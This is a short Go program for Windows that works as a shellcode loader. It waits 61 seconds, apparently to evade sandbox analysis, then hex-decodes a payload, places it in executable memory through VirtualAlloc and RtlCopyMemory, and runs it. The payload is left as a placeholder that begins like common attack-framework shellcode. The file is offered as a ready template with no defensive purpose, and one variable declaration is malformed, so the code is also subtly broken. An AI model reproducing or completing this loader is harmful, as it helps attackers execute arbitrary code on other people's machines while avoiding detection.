package main

import (
	"encoding/hex"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	code          = "fc4883e4f0e8c..." //16进制字符串代码
	decode1       "shellcode here"
)

func main() {

	time.Sleep(61 * time.Second)

	decode, _ := hex.DecodeString(decode1)
	xor_code := decode

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(xor_code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&xor_code[0])), uintptr(len(xor_code)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)

}
